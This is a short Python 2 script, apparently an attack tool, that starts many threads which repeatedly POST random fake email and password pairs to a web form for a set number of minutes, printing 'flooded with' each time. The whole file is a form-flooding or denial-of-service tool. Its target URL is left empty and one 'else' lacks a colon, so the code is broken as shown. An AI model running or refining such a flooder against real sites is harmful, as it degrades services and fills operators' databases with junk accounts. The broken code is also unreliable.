import urllib
import urllib2 
import random
import string
from threading import Thread
import sys
import time

'''the number of threads'''
num = int (sys.argv[1])

'''the number of minutes to run'''
minute = int (sys.argv[2])

'''the time to stop'''
timeout = time.time() + 60*minute

def attack():
	while True:
		if time.time() <= timeout:
			data = {
				'email': id_generator(random.randint(3,10))+"@"+id_generator(random.randint(3,10))+".com",
				'password': id_generator(random.randint(3,10)),
			}
			req = urllib2.Request(url="",
								  data=urllib.urlencode(data), 
								  headers={"Content-type": "application/x-www-form-urlencoded"}) 
			response = urllib2.urlopen(req)
			the_page = response.read()
			print 'flooded with '+ str(data)
		else
			break

def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
	return ''.join(random.choice(chars) for _ in range(size))

if __name__ == "__main__":
    for k in range(0, num):
        thread = Thread(target = attack)
        thread.start()
        print 'Launched thread '+str(k)
        print 
